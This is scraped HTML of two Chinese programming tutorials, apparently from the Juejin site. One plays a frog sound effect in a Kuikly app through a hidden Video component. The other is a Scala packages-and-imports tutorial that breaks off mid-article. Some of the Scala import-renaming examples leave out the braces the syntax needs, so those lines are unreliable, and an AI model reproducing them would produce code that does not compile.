content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kuikly基础之音频播放与资源管理：青蛙叫声实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1559379316800/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    在下历飞雨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:28:19.000Z" title="Mon Nov 24 2025 03:28:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在上一篇文章中，我们成功地让青蛙对我们的点击做出了视觉上的响应——一个生动的缩放动画。现在，我们的应用不再是静态的了，但似乎还缺点什么。</p>
<p>没错，就是声音！交互不仅仅是视觉上的，听觉上的反馈同样重要。如果每次点击青蛙，它都能发出一声清脆的“呱”，那应用的趣味性和沉浸感无疑会更上一层楼。</p>
<p>今天，我们就来完成这个任务：为我们的“单身青蛙”应用加上音效，让它在被点击时，能真实地“叫”出来。同时，我们也会探讨在Kuikly中如何进行基础的音频资源管理。</p>
<h2 data-id="heading-0">初步计划</h2>
<p>在动手之前，我们自然是先去翻了翻Kuikly的文档，想找找有没有现成的音频播放组件，比如一个叫<code>&lt;Audio&gt;</code>的家伙。结果发现，似乎并没有这样一个专门为播放短音效而生的轮子。</p>
<p>不过，没有“直路”，我们可以“绕路”走嘛。Kuikly提供了一个功能强大的<code>&lt;Video&gt;</code>组件。既然视频能包含声音，我们是不是可以利用它来只播放声音呢？这个想法听起来不错。</p>
<p>我们的计划是：准备一个音频文件（就是我们之前准备好的<code>frog_sound.mp3</code>），然后把它“伪装”成一个视频源交给<code>&lt;Video&gt;</code>组件。为了不让它在界面上“碍眼”，我们再把它设置成一个1x1像素的、完全透明的“隐形”播放器。</p>
<h3 data-id="heading-1">实战</h3>
<p>好了，理论有了，开干！</p>
<p>我们最初的想法很简单直接：既然拿到了<code>&lt;Video&gt;</code>组件的引用（<code>ViewRef</code>），那在点击事件里直接调用它的<code>play()</code>方法不就行了？就像这样：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 理想中的代码...</span>
ctx.soundPlayerRef.view?.play() 
</code></pre>
<p>然而，现实很快给了我们一拳，编译器无情地报错：<code>Unresolved reference: play</code>。好吧，看来此路不通。这种命令式的、直接操作视图的方式，似乎并不符合Kuikly的“口味”。</p>
<p>这次碰壁让我们冷静下来，重新思考Kuikly的设计哲学——声明式UI。我们不应该去“命令”一个组件去播放，而应该“声明”它的状态是“正在播放”。</p>
<p>于是，新的方案诞生了：</p>
<ol>
<li>定义一个<code>observable</code>的状态变量 <code>soundPlayControl</code>，用来控制播放行为（播放/暂停）。</li>
<li>将<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性绑定到这个状态上。</li>
<li>当用户点击青蛙时，我们不再调用方法，而是去更新<code>soundPlayControl</code>的状态为<code>VideoPlayControl.PLAY</code>。</li>
<li>监听<code>&lt;Video&gt;</code>的<code>playStateDidChanged</code>事件，当播放结束（状态变为<code>PlayState.PLAY_END</code>）时，再将<code>soundPlayControl</code>的状态改回<code>VideoPlayControl.PAUSE</code>，为下一次播放做准备。</li>
</ol>
<p>这个思路听起来就“地道”多了！它完美地融入了整个应用的响应式数据流。</p>
<h3 data-id="heading-2">最终代码</h3>
<p>说干就干，我们立刻对<code>FrogMainPage.kt</code>进行了改造，最终的代码如下：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ... 省略部分import ...</span>
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.base.ViewRef
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.PlayState
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.Video
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoPlayControl
<span class="hljs-keyword">import</span> com.tencent.kuikly.core.views.VideoView

<span class="hljs-comment">// ...</span>

<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrogMainPage</span> : <span class="hljs-type">BasePager</span>() {

    <span class="hljs-comment">// ... 省略其他状态变量 ...</span>
    <span class="hljs-keyword">lateinit</span> <span class="hljs-keyword">var</span> soundPlayerRef: ViewRef&lt;VideoView&gt;
    <span class="hljs-comment">// 新增一个控制音频播放的状态</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> soundPlayControl: VideoPlayControl <span class="hljs-keyword">by</span> observable(VideoPlayControl.PAUSE)

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">body</span><span class="hljs-params">()</span></span>: ViewBuilder {
        <span class="hljs-keyword">val</span> ctx = <span class="hljs-keyword">this</span>
        <span class="hljs-keyword">return</span> {
            <span class="hljs-comment">// ... 省略大部分UI布局 ...</span>
            
                        <span class="hljs-comment">// 主青蛙按钮</span>
                        View {
                            <span class="hljs-comment">// ... 省略部分 attr ...</span>
                            event {
                                 click {
                                     <span class="hljs-comment">// ... 省略其他点击事件逻辑 ...</span>
                                     
                                     <span class="hljs-comment">// 更新状态，触发音频播放</span>
                                     <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PLAY
                                 }
                             }
                        }
            
            <span class="hljs-comment">// ... 省略部分UI布局 ...</span>

                <span class="hljs-comment">// “隐形”的音频播放器</span>
                Video {
                    ref {
                        ctx.soundPlayerRef = it
                    }
                    attr {
                        src(<span class="hljs-string">"media/frog_sound.mp3"</span>)
                        width(<span class="hljs-number">1f</span>)
                        height(<span class="hljs-number">1f</span>)
                        opacity(<span class="hljs-number">0f</span>)
                        <span class="hljs-comment">// 将播放行为和我们的状态绑定</span>
                        playControl(<span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl)
                    }
                    event {
                        <span class="hljs-comment">// 监听播放状态</span>
                        playStateDidChanged { state, _ -&gt;
                            <span class="hljs-comment">// 播放结束后，重置状态以便下次播放</span>
                            <span class="hljs-keyword">if</span> (state == PlayState.PLAY_END) {
                                <span class="hljs-keyword">this</span><span class="hljs-symbol">@FrogMainPage</span>.soundPlayControl = VideoPlayControl.PAUSE
                            }
                        }
                    }
                }
                
            <span class="hljs-comment">// ... 省略底部功能区 ...</span>
        }
    }
    
    <span class="hljs-comment">// ... 省略生命周期方法 ...</span>
}
</code></pre>
<p>代码解释：</p>
<ol>
<li><strong><code>soundPlayControl</code>状态</strong>：我们新增了一个<code>observable</code>变量，它的类型是<code>VideoPlayControl</code>，默认值为<code>PAUSE</code>。</li>
<li><strong>状态更新触发播放</strong>：在青蛙的<code>click</code>事件中，我们不再调用任何方法，而是简单地将<code>soundPlayControl</code>的值改为<code>VideoPlayControl.PLAY</code>。</li>
<li><strong>属性绑定</strong>：<code>&lt;Video&gt;</code>组件的<code>playControl</code>属性直接绑定了<code>soundPlayControl</code>状态。当状态改变时，Kuikly框架会自动更新组件，从而控制视频（音频）的播放或暂停。</li>
<li><strong>播放后重置状态</strong>：我们监听<code>playStateDidChanged</code>事件。在探索中我们发现，当播放完成时，状态会变为<code>PlayState.PLAY_END</code>。此时，我们把<code>soundPlayControl</code>重新设置为<code>PAUSE</code>，这样就完成了一个播放循环，并且可以让青蛙被连续点击发声。</li>
</ol>
<h2 data-id="heading-3">结语</h2>
<p>现在，重新编译运行，再次点击那只青蛙。伴随着熟悉的缩放动画，一声清脆的“呱”终于响了起来！虽然中间走了点小弯路，但我们最终还是用一种更“Kuikly”的方式，让我们的应用“活”了起来。这次的经历也让我们对Kuikly的声明式思想有了更深的理解：少一些命令，多一些声明，代码会变得更优雅、更可预测。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[包及其导入]]></title>    <link>https://juejin.cn/post/7575469988737957897</link>    <guid>https://juejin.cn/post/7575469988737957897</guid>    <pubDate>2025-11-24T03:31:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575469988737957897" data-draft-id="7575469988737744905" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="包及其导入"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T03:31:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="谁黑皮谁肘击谁在连累直升机"/> <meta itemprop="url" content="https://juejin.cn/user/2763534402854203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            包及其导入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2763534402854203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    谁黑皮谁肘击谁在连累直升机
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:31:55.000Z" title="Mon Nov 24 2025 03:31:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、Scala 包（Package）的概念及使用</h2>
<p>Scala 的包（Package）本质与 Java 包一致，核心作用是 <strong>组织代码结构、避免类 / 特质 / 方法的命名冲突</strong>，同时支持访问控制（控制代码的可见性）。但 Scala 对包的语法进行了增强，比 Java 更灵活（如嵌套包、包对象、包前缀简化等）。</p>
<h3 data-id="heading-1">1. 包的核心概念</h3>
<ul>
<li>
<p><strong>本质</strong>：一个 “命名空间”（Namespace），用于将相关的类（Class）、特质（Trait）、对象（Object）、函数（Function）等代码元素分组管理。</p>
</li>
<li>
<p><strong>命名规范</strong>：通常遵循 “反向域名” 规则（与 Java 一致），例如 <code>com.company.project.module</code>，全小写字母，用 <code>.</code> 分隔层级。</p>
</li>
<li>
<p><strong>核心作用</strong>：</p>
<ol>
<li>避免命名冲突（不同包下可存在同名类，如 <code>com.a.User</code> 和 <code>com.b.User</code>）；</li>
<li>模块化管理代码（按功能拆分，如 <code>controller</code>、<code>service</code>、<code>model</code> 包）；</li>
<li>控制访问权限（通过 <code>private</code>、<code>protected</code> 等关键字限制包外访问）。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-2">2. 包的定义与目录结构</h3>
<p>Scala 包的定义必须与 <strong>文件系统目录结构一致</strong>（否则编译器无法找到代码），这一点和 Java 完全相同。</p>
<h4 data-id="heading-3">（1）基础定义方式（与 Java 类似）</h4>
<p>通过 <code>package</code> 关键字声明包，放在文件最顶部，一个文件只能声明一个 “主包”（但可嵌套子包）。</p>
<h5 data-id="heading-4">示例：目录结构与包声明对应</h5>
<p>plaintext</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">src</span>/<span class="hljs-selector-tag">main</span>/<span class="hljs-selector-tag">scala</span>/          <span class="hljs-comment">// Scala 源代码根目录</span>
└── <span class="hljs-selector-tag">com</span>/
    └── <span class="hljs-selector-tag">example</span>/
        ├── <span class="hljs-selector-tag">model</span>/       <span class="hljs-comment">// 子包：存储数据模型</span>
        │   └── <span class="hljs-selector-tag">User</span><span class="hljs-selector-class">.scala</span>
        └── <span class="hljs-selector-tag">service</span>/     <span class="hljs-comment">// 子包：存储业务逻辑</span>
            └── <span class="hljs-selector-tag">UserService</span><span class="hljs-selector-class">.scala</span>
</code></pre>
<h5 data-id="heading-5">代码示例：<code>User.scala</code>（数据模型）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 包声明：对应目录 com/example/model</span>
<span class="hljs-keyword">package</span> com.example.model

<span class="hljs-comment">// 包内定义类（默认访问权限：包可见）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String, <span class="hljs-keyword">val</span> age: <span class="hljs-built_in">Int</span>) {
  <span class="hljs-keyword">override</span> def toString: String = s<span class="hljs-string">"User(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>)"</span>
}

<span class="hljs-comment">// 包内定义对象（单例）</span>
<span class="hljs-keyword">object</span> User {
  <span class="hljs-comment">// 工厂方法：创建 User 实例</span>
  def apply(name: String, age: <span class="hljs-built_in">Int</span>): User = new User(name, age)
}
</code></pre>
<h5 data-id="heading-6">代码示例：<code>UserService.scala</code>（业务逻辑）</h5>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 包声明：对应目录 com/example/service</span>
package com.example.service

<span class="hljs-comment">// 导入其他包的类（与 Java 类似，用 import）</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-comment">// 业务方法：查询用户</span>
  <span class="hljs-function">def <span class="hljs-title">findUser</span><span class="hljs-params">(name: <span class="hljs-type">String</span>)</span>: User =</span> <span class="hljs-built_in">User</span>(name, <span class="hljs-number">20</span>)
}
</code></pre>
<h4 data-id="heading-7">（2）Scala 增强：嵌套包（Nested Package）</h4>
<p>Scala 支持在一个文件中定义嵌套包，无需创建多层目录（但仍建议目录与包结构一致，保证可读性）。</p>
<h5 data-id="heading-8">示例：嵌套包定义</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 外层包</span>
<span class="hljs-keyword">package</span> com.example {
  <span class="hljs-comment">// 子包 model（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> model {
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-keyword">val</span> name: String)
  }

  <span class="hljs-comment">// 子包 service（嵌套在 com.example 下）</span>
  <span class="hljs-keyword">package</span> service {
    <span class="hljs-keyword">import</span> model.User  <span class="hljs-comment">// 嵌套包内可直接导入同级子包，无需写全路径</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
      def getUser: User = new User(<span class="hljs-string">"Alice"</span>)
    }
  }
}
</code></pre>
<h5 data-id="heading-9">注意：</h5>
<ul>
<li>嵌套包的访问规则：内层包可直接访问外层包的元素（无需导入），外层包不能直接访问内层包（需显式导入）；</li>
<li>实际开发中，嵌套包多用于 “内部工具类” 或 “关联性极强的代码”，避免过度嵌套导致可读性下降。</li>
</ul>
<h4 data-id="heading-10">（3）Scala 专属：包对象（Package Object）</h4>
<p>Scala 不允许在包内直接定义函数 / 变量（Java 也不允许），但提供 <strong>包对象（Package Object）</strong>  来解决这个问题 —— 包对象是对应包的 “全局工具容器”，可定义全局函数、变量、隐式转换等，包内所有代码可直接访问。</p>
<h5 data-id="heading-11">包对象的定义规则：</h5>
<ul>
<li>包对象必须与对应包同名，且放在该包的 “父包” 下；</li>
<li>文件名固定为 <code>package.scala</code>（编译器会自动识别）。</li>
</ul>
<h5 data-id="heading-12">示例：定义包对象</h5>
<p>scala</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// 目录：com/example/package.scala（父包是 com，对应包是 example）</span>
<span class="hljs-keyword">package</span> com  <span class="hljs-comment">// 父包</span>

<span class="hljs-comment">// 定义 com.example 包的包对象</span>
<span class="hljs-keyword">package</span> <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">example</span> </span>{
  <span class="hljs-comment">// 全局常量（包内所有类可直接使用）</span>
  <span class="hljs-keyword">val</span> <span class="hljs-type">APP_NAME</span>: <span class="hljs-type">String</span> = <span class="hljs-string">"ScalaPackageDemo"</span>
  
  <span class="hljs-comment">// 全局函数（包内所有类可直接调用）</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printLog</span></span>(msg: <span class="hljs-type">String</span>): <span class="hljs-type">Unit</span> = println(<span class="hljs-string">s"[<span class="hljs-subst">$APP_NAME</span>] <span class="hljs-subst">$msg</span>"</span>)
  
  <span class="hljs-comment">// 全局隐式转换（后续可直接生效）</span>
  <span class="hljs-keyword">implicit</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stringToInt</span></span>(s: <span class="hljs-type">String</span>): <span class="hljs-type">Int</span> = s.toInt
}
</code></pre>
<h5 data-id="heading-13">包对象的使用（无需导入，直接访问）</h5>
<p>scala</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.service

<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  def test(): <span class="hljs-built_in">Unit</span> = {
    printLog(<span class="hljs-string">"测试包对象函数"</span>)  <span class="hljs-comment">// 直接调用包对象的函数</span>
    println(APP_NAME)          <span class="hljs-comment">// 直接访问包对象的常量</span>
    <span class="hljs-keyword">val</span> num: <span class="hljs-built_in">Int</span> = <span class="hljs-string">"123"</span>       <span class="hljs-comment">// 直接使用包对象的隐式转换（String → Int）</span>
  }
}
</code></pre>
<h5 data-id="heading-14">核心用途：</h5>
<ul>
<li>存储包级别的工具函数 / 常量（如配置、日志工具）；</li>
<li>定义包级别的隐式转换（避免在每个类中重复导入）；</li>
<li>统一管理包内依赖的公共资源。</li>
</ul>
<h3 data-id="heading-15">3. 包的导入（Import）</h3>
<p>Scala 的 <code>import</code> 语法比 Java 更灵活，支持通配、重命名、过滤等功能，核心目的是简化代码中对其他包元素的引用。</p>
<h4 data-id="heading-16">（1）基础导入（与 Java 一致）</h4>
<p>scala</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 导入单个类</span>
<span class="hljs-keyword">import</span> com.example.model.User

<span class="hljs-comment">// 导入多个类（用大括号包裹）</span>
<span class="hljs-keyword">import</span> com.example.model.{User, UserProfile}

<span class="hljs-comment">// 导入整个包（通配符，用 _ 代替 Java 的 *）</span>
<span class="hljs-keyword">import</span> com.example.model._
</code></pre>
<h4 data-id="heading-17">（2）Scala 增强：重命名与过滤</h4>
<p>避免导入冲突（如两个包有同名类），或简化长类名：</p>
<p>scala</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 重命名：将 User 重名为 ModelUser（避免冲突）</span>
<span class="hljs-keyword">import</span> com.example.model.User =&gt; ModelUser

<span class="hljs-comment">// 过滤：导入包中所有类，除了 User（exclude）</span>
<span class="hljs-keyword">import</span> com.example.model.{User =&gt; _, _}  <span class="hljs-comment">// 第一个 _ 表示“排除”，第二个 _ 表示“其余所有”</span>

<span class="hljs-comment">// 示例：解决冲突</span>
<span class="hljs-keyword">import</span> com.a.User
<span class="hljs-keyword">import</span> com.b.User =&gt; BUser  <span class="hljs-comment">// 重命名 com.b.User 为 BUser</span>

